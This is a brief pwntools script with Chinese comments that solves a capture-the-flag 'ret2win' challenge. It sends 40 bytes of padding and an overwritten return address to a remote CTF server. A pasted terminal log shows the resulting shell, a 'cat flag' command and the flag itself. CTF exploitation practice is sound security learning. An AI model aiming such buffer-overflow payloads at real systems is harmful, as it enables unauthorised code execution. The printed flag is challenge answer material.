from pwn import *

# 建立连接
io = remote('svtctf.m0lecon.it', 13469) # 确认端口号是否正确

# 构造 Payload (尝试对齐版本 0x40119a 成功率更高)
payload = b'A' * 40 + p64(0x40119a)

io.sendlineafter(b"name:", payload)

# 保持交互，如果成功，你就可以输入 ls 和 cat flag 了
io.interactive()

#(pwn_env) hanabi@polito:~/svt_ctf/round_2/ret2win$ python3 solution.py 
#[+] Opening connection to svtctf.m0lecon.it on port 13469: Done
#[*] Switching to interactive mode
# Hello, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x9a\x11@!
#$ ls
#chall
#flag
#$ cat flag
#svt{r3writ1n9_th3_ex3cut1i0n_f0r_fun_4nd_pr0f1t_8zXAv9eYDlEOyWNk}